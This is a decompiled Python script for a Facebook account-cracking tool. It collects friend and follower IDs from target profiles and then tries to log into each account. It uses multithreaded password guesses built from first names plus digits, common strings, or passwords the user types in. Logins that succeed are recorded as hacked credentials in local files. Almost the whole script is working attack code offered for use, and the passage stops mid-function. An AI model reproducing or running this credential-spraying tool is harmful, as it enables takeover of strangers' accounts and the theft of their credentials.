# Source Generated with Decompyle++
# File: without.pyc (Python 2.7)



try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests lolcat")
	

agents = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
birth = [
    '001',
    '02',
    '03',
    '04',
    '05',
    '06',
    '07',
    '08',
    '09',
    '10',
    '11',
    '12',
    '13',
    '14',
    '15',
    '16',
    '17',
    '18',
    '19',
    '20',
    '21']
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3',
    'x-fb-connection-type': 'unknown',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

def logo():
    os.system('echo "\n \n       / __ )/   |  / | / / __ \/ / / / /   /   |\n      / __  / /| | /  |/ / / / / / / / /   / /| |\n     / /_/ / ___ |/ /|  / /_/ / /_/ / /___/ ___ |\n    /_____/_/  |_/_/ |_/_____/\____/_____/_/  |_|\n \n " | lolcat -a -d 2 -s 50')
 
def tool():
    os.system('clear')
    print ''
    logo()
    time.sleep(1)
    print ' TOOL USERNAME...'.center(50)
    print ''
    time.sleep(1)
    username = raw_input('[+] Tool Username : ')
    if username == 'BANDULA':
        print ''
        time.sleep(1)
        print '\x1b[1;92mTool Username Is Correct'.center(50)
        print ''
        time.sleep(1)
        step_main()
    else:
        print ''
        time.sleep(1)
        print '\x1b[1;91mTool Username Is Invalid :) '.center(50)
        os.system('xdg-open https://www.facebook.com/marmu.007')
        print ''
        time.sleep(1)
        tool()


def step_main():
    os.system('clear')
    logo()
    print ''
    time.sleep(1)
    print 'TOOL PASSWORD...'.center(50)
    print ''
    time.sleep(1)
    password = raw_input('[+] Tool Password : ')
    if password == 'BANDULA':
        print ''
        time.sleep(1)
        print '\x1b[1;92mTool Password Is Correct'.center(50)
        print ''
        time.sleep(1)
        main()
    else:
        print ''
        time.sleep(1)
        print '\x1b[1;91mTool Password Is Invalid :) '.center(50)
        os.system('xdg-open https://www.facebook.com/marmu.007')
        print ''
        time.sleep(1)
        step_main()


def main():
    os.system('clear')
    logo()
    print ' \t [\x1b[1;97m\x1b[1;41m   CREATION BY M 4 R M U   \x1b[0m\x1b[1;93m]'.center(50)
    print 54 * '\x1b[1;93m_'
    print ''
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mStart Cracking....'
    print '\x1b[1;93m[2] \x1b[1;92mContact To Facebook Page'
    print '\x1b[1;93m[3] \x1b[1;92mJoin TO Telegram Member(PAID) '
    print '\x1b[1;93m[0] \x1b[1;92mExit'
    print 47 * '\x1b[1;94m\xe2\x96\xac'    
    main_select()

def main_select():
    mamu = raw_input('\n\x1b[1;91mSelect Option \xe2\x89\xbb \x1b[1;92m')
    if mamu == '':
        print '\x1b[1;97mOppps!! Stupid! You choose one number..'
        main()
    elif mamu == '1':
        login()
    elif mamu == '2':
        os.system('xdg-open https://www.facebook.com/marmu.007')
        main()
    elif mamu == '3':
        os.system('xdg-open https://www.t.me/')
        main()    
        main()
    elif mamu == '0':
        os.system('exit')
    else:
        print '\x1b[1;91m[!] Please select a valid option'.center(50)
        time.sleep(2)
        main()


def login():
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        print ''
        print '    \t [\x1b[1;97m\x1b[1;41m   M E N U   \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print 47 * '\x1b[1;94m\xe2\x96\xac'
        print '\x1b[1;96m[1] \x1b[1;95mLogin With Fb Token\n'
        print '\x1b[1;96m[2] \x1b[1;95mLogin With Fb Username/Id & Password\n'
        print '\x1b[1;96m[3] \x1b[1;95mNo Login Fb Cracking\n'
        print '\x1b[1;91m[4] \x1b[1;95mBack '
        print 47 * '\x1b[1;94m\xe2\x96\xac'
        print ''
        log_select()



def log_select():
    sel = raw_input('Choose option: \x1b[1;92m')
    if sel == '2':
        log_fb()
    elif sel == '1':
        token()
    elif sel == '3':        
        print '\t COMMING SOON...'
        os.system('xdg-open https://m.facebook.com/marmu.007')
    elif sel == '4':
        main()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def log_fb():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        logo()
        print ' \t        [\x1b[1;97m\x1b[1;41m  Login with Your New Facebook Acc  \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        uid = raw_input('\x1b[1;95m[+] Email: \x1b[1;93m')
        print ''
        passw = raw_input('\x1b[1;92m[+] Password: \x1b[1;93m')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers = header).text
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('access_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\t\x1b[1;91mBaBycp'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\t\x1b[1;91mId or Password may be wrong..'
            print ''
            time.sleep(1)



def token():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        logo()
        print ' \t       [\x1b[1;97m\x1b[1;41m  Login with FB Token  \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print ''
        token = raw_input(' \x1b[1;95m[+] Token : \x1b[1;90m')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()



def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
        logo()
        print ''
        print '\x1b[1;92m\t Your Token Sucessfull'
        time.sleep(1)
    except KeyError:
        logo()
        print ''
        print '\x1b[1;91m\t Logged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    logo()
    print ' \t       Wellcome :\x1b[1;92m ' + name
    print 54 * '\x1b[1;93m_'
    print ''
    print ' \t       [\x1b[1;97m\x1b[1;41m  Choose method  \x1b[0m\x1b[1;93m]'.center(50)
    print ''
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print '\x1b[1;95m[1] \x1b[1;96mCRACK WITH AUTO PASS\n'
    print '\x1b[1;95m[2] \x1b[1;96mCRACK WITH MANUAL PASS\n'
    print '\x1b[1;91m[3] \x1b[1;96mBACK'
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m Select Option: \x1b[1;95m')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        main()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print '\x1b[1;97m[1] \x1b[1;95mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;97m[2] \x1b[1;95mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;91m[0] \x1b[1;92mBACK'
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;93mChoose option: \x1b[1;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ' \t       [\x1b[1;97m\x1b[1;41m  Put 3 idzz Links  \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogin id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        logo()
        print ' \t       [\x1b[1;97m\x1b[1;41m  Put 3 id Links  \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' \x1b[1;95mTotal IDs :\x1b[1;92m ' + str(len(id))
    print ' \x1b[1;95m process has been Started'
    print ' \x1b[1;91mPlzz wait to crack idzz'
    print ' \x1b[1;96mPress ctrl + z to stop'
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 3 time \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;95m_'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({
            'User-Agent': ranagent })
        
        try:
            pass1 = name.lower() + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('mamuok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('mamucp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('mamuok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('mamucp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('mamuok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('mamucp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '8888'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('mamuok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('mamucp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = '654321'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('mamuok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('mamucp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = 'Myanmar'
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('mamuok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('mamucp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'myanmar123'
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('mamuok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[BANDULA-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('mamucp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 54 * '\x1b[1;92m_'
    print ''
    print ' \x1b[1;95mThe process has been completed'
    print ' \x1b[1;95mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;92mNote: Hacked Account Saved SDcard Folder: BaBycp.txt'
    print 54 * '_'
    print ''
    print ''
    raw_input(' \x1b[1;93m Press enter to back ')
    menu()


def choice():
    global token
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print '\x1b[1;97m[1] \x1b[1;96mCRACK PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;97m[2] \x1b[1;96mCRACK FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
    print '\x1b[1;91m[0] \x1b[1;92mBACK'
    print 47 * '\x1b[1;94m\xe2\x96\xac'
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;93mChoose option: \x1b[1;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
        print ''
        print ''
        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;93m ')
        pass2 = raw_input('\x1b[1;92m[+] Password [2] :\x1b[1;92m ')
        pass3 = raw_input('\x1b[1;91m[+] Password [3] :\x1b[1;91m ')
        pass4 = raw_input('\x1b[1;97m[+] Password [4] :\x1b[1;90m ')
        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;93m ')
        pass6 = raw_input('\x1b[1;92m[+] Password [6] :\x1b[1;92m ')
        pass7 = raw_input('\x1b[1;91m[+] Password [7] :\x1b[1;91m ')
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogin id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;91mLogin id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to Back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        print logo
        print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
        print ''
        print ''
        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;92m ')
        pass2 = raw_input('\x1b[1;93m[+] Password [2] :\x1b[1;92m ')
        pass3 = raw_input('\x1b[1;93m[+] Password [3] :\x1b[1;92m ')
        pass4 = raw_input('\x1b[1;93m[+] Password [4] :\x1b[1;92m ')
        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;92m ')
        pass6 = raw_input('\x1b[1;93m[+] Password [6] :\x1b[1;92m ')
        pass7 = raw_input('\x1b[1;93m[+] Password [7] :\x1b[1;92m ')
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print ' \x1b[1;93mTotal IDs :\x1b[1;92m ' + str(len(id))
    print ' \x1b[1;93mhacking process has been Started'
    print ' \x1b[1;93mPlzz wait to crack idzz'
    print ' \x1b[1;93mPress ctrl + z to stop'
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 Second \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({
            'User-Agent': ranagent })
        
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('mamuok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('mamucp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('mamuok.txt', 'a')
